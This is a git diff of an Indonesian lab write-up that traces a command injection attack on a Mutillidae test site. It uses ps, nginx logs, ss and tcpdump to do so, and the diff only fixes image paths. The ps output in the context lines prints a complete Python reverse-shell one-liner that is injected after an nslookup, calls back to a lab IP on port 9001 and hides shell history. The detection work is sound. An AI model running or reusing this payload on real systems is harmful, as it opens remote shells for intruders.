@@ -46,7 +46,7 @@ ps aux | grep -E 'python'
 
 **Output dari Lab:**
 
-![Proses dari user www-data](../proses-from-user-www-data.png)
+![Proses dari user www-data](proses-from-user-www-data.png)
 ```text
 root         874  0.0  1.1 109688 23292 ?        Ssl  11:57   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
 www-data    3861  0.0  0.0   2800  1852 ?        S    16:13   0:00 sh -c -- nslookup google.com; python3 -c 'import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.149",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close();'
@@ -60,7 +60,7 @@ root        3886  0.0  0.1   6544  2328 pts/4    S+   16:18   0:00 grep --color=
 
 Setiap request yang masuk ke Nginx pasti tercatat di `access.log`. Kita bisa memantau *endpoint* mana yang diserang.
 
-![Command Injection Web](../Command-injection.png)
+![Command Injection Web](Command-injection.png)
 
 ```bash
 # Log Nginx (request client masuk dari attacker)
@@ -69,7 +69,7 @@ tail -f /var/log/nginx/access.log
 
 **Output dari Lab:**
 
-![Log Nginx](../log-nginx.png)
+![Log Nginx](log-nginx.png)
 ```text
 10.10.10.149 - - [26/Jun/2026:16:10:05 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 200 8771 "https://mutillidae.owasp.hacking/index.php?page=dns-lookup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
 10.10.10.149 - - [26/Jun/2026:16:10:55 +0700] "POST /index.php?page=dns-lookup.php HTTP/1.1" 200 8773 "https://mutillidae.owasp.hacking/index.php?page=dns-lookup.php" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
@@ -89,7 +89,7 @@ ss -tnp
 
 **Output dari Lab:**
 
-![State Active Open Port](../state-active-open-port.png)
+![State Active Open Port](state-active-open-port.png)
 ```text
 State         Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
 ...
@@ -106,7 +106,7 @@ sudo tcpdump -i any port 9001 -nn -A -l
 
 **Output dari Lab:**
 
-![Network tcpdump](../network-tcpdump.png)
+![Network tcpdump](network-tcpdump.png)
 ```text
 16:13:15.687717 ens33 Out IP 10.10.10.2.49342 > 10.10.10.149.9001: Flags [P.], seq 1:49, ack 1, win 502, options [nop,nop,TS val 1701540689 ecr 1928400169], length 48
 E..d..@.@..5
